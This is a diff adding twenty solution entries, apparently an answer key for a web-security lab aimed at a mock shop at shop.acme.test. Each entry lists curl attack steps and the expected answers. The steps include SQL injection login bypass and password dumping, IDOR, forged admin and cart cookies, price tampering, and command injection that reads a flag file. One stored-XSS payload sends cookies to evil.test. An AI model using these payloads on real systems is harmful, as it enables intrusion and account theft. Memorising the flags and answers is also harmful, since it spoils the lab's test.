@@ -226,5 +226,207 @@
       "o4": "dev-notes",
       "o5": "FLAG{dirbusting_finds_forgotten_pages}"
     }
+  },
+  "c04-m01": {
+    "steps": [
+      {
+        "cmd": "curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login",
+        "capture": {
+          "SESSION": "session=([0-9a-f]+)"
+        }
+      },
+      "curl -b 'session=${SESSION}' http://shop.acme.test/account/order?id=101",
+      "curl -b 'session=${SESSION}' http://shop.acme.test/account/order?id=102"
+    ],
+    "submit": {
+      "o4": "FLAG{idor_lets_you_read_anyones_order}"
+    }
+  },
+  "c04-m02": {
+    "steps": [
+      "curl -i http://shop.acme.test/admin/diagnostics",
+      "curl -i -b 'role=admin' http://shop.acme.test/admin/diagnostics"
+    ],
+    "submit": {
+      "o3": "cookie"
+    }
+  },
+  "c04-m03": {
+    "steps": [
+      "curl -d 'username=alice&password=wrongpass' http://shop.acme.test/login",
+      "curl -i -d \"username=admin'-- &password=x\" http://shop.acme.test/login"
+    ],
+    "submit": {
+      "o3": "admin"
+    }
+  },
+  "c04-m04": {
+    "steps": [
+      "curl -s -G --data-urlencode \"q=zzz' UNION SELECT id, concat(username,':',password), 0 FROM users-- -\" http://shop.acme.test/search"
+    ],
+    "submit": {
+      "o3": "Adm1n_P@ss_2024"
+    }
+  },
+  "c04-m05": {
+    "steps": [
+      "curl -s -G --data-urlencode \"q=zzz' UNION SELECT id, concat(username,':',password), 0 FROM users-- -\" http://shop.acme.test/search"
+    ],
+    "submit": {
+      "o3": "plaintext"
+    }
+  },
+  "c04-m06": {
+    "steps": [
+      "curl -i -d 'username=alice&password=alice123&remember=1' http://shop.acme.test/login",
+      "curl -b 'remember=YWRtaW4=' http://shop.acme.test/account"
+    ],
+    "submit": {
+      "o2": "alice"
+    }
+  },
+  "c04-m07": {
+    "steps": [
+      "curl -s -G --data-urlencode 'q=<script>alert(1)</script>' http://shop.acme.test/search"
+    ],
+    "submit": {
+      "o3": "escape"
+    }
+  },
+  "c04-m08": {
+    "steps": [
+      "curl -d 'product_id=2&author=me&body=<script>document.location=\"http://evil.test?c=\"+document.cookie</script>' http://shop.acme.test/comments",
+      "curl -s http://shop.acme.test/product?id=2"
+    ],
+    "submit": {
+      "o3": "yes"
+    }
+  },
+  "c04-m09": {
+    "steps": [
+      "curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; id' http://shop.acme.test/admin/diagnostics",
+      "curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; cat /var/www/html/flag.txt' http://shop.acme.test/admin/diagnostics"
+    ],
+    "submit": {
+      "o4": "FLAG{command_injection_pops_the_shell}"
+    }
+  },
+  "c04-m10": {
+    "steps": [
+      "curl http://10.10.20.5/.git/config"
+    ],
+    "submit": {
+      "o3": "FLAG{exposed_git_folder_leaks_your_source}"
+    }
+  },
+  "c04-m11": {
+    "steps": [
+      "curl -i -d 'user=admin&pass=admin' http://10.10.20.5/login"
+    ],
+    "submit": {
+      "o2": "admin"
+    }
+  },
+  "c04-m12": {
+    "steps": [
+      "whatweb 10.10.20.5"
+    ],
+    "submit": {
+      "o2": "1.12.4",
+      "o3": "xss"
+    }
+  },
+  "c04-m13": {
+    "steps": [
+      "curl -s http://shop.acme.test/package.json"
+    ],
+    "submit": {
+      "o2": "4.17.4"
+    }
+  },
+  "c04-m14": {
+    "steps": [
+      {
+        "cmd": "curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login",
+        "capture": {
+          "SESSION": "session=([0-9a-f]+)"
+        }
+      },
+      "curl -b 'session=${SESSION}' -G --data-urlencode 'product_id=2' --data-urlencode 'qty=1' --data-urlencode 'price=0.01' --data-urlencode 'confirm=1' http://shop.acme.test/buy"
+    ],
+    "submit": {
+      "o4": "server"
+    }
+  },
+  "c04-m15": {
+    "steps": [
+      {
+        "cmd": "curl -i -d 'username=bob&password=Password1' http://shop.acme.test/login",
+        "capture": {
+          "SESSION": "session=([0-9a-f]+)"
+        }
+      },
+      "curl -b 'session=${SESSION}' -G --data-urlencode 'product_id=2' --data-urlencode 'qty=-5' --data-urlencode 'confirm=1' http://shop.acme.test/buy"
+    ],
+    "submit": {
+      "o3": "positive"
+    }
+  },
+  "c04-m16": {
+    "steps": [
+      "curl \"http://shop.acme.test/forgot-password?username=admin\"",
+      "curl \"http://shop.acme.test/forgot-password?username=ghost\""
+    ],
+    "submit": {
+      "o3": "ghost"
+    }
+  },
+  "c04-m17": {
+    "steps": [
+      "curl -i -b 'session=fixedtoken123' -d 'username=bob&password=Password1' http://shop.acme.test/login",
+      "curl -b 'session=fixedtoken123' http://shop.acme.test/account"
+    ],
+    "submit": {
+      "o3": "session fixation"
+    }
+  },
+  "c04-m18": {
+    "steps": [
+      {
+        "cmd": "curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login",
+        "capture": {
+          "SESSION": "session=([0-9a-f]+)"
+        }
+      },
+      {
+        "cmd": "curl -i -b 'session=${SESSION}' http://shop.acme.test/cart",
+        "capture": {
+          "CART_B64": "cart=([A-Za-z0-9+/=]+)"
+        }
+      },
+      "curl -b 'session=${SESSION};cart=eyJpdGVtcyI6W3siaWQiOjIsIm5hbWUiOiJNZWNoYW5pY2FsIEtleWJvYXJkIiwicXR5IjoxfV0sInRvdGFsIjowLjAxfQ==' http://shop.acme.test/cart/checkout",
+      "curl -b 'session=${SESSION}' http://shop.acme.test/account"
+    ],
+    "submit": {
+      "o4": "server"
+    }
+  },
+  "c04-m19": {
+    "steps": [
+      "cat /var/log/apache2/access.log"
+    ],
+    "submit": {
+      "o2": "10.10.14.77",
+      "o3": "union",
+      "o4": "2"
+    }
+  },
+  "c04-m20": {
+    "steps": [
+      "curl -i -d \"username=admin'&password=x\" http://shop.acme.test/login"
+    ],
+    "submit": {
+      "o2": "/var/www/html/db.php"
+    }
   }
 }
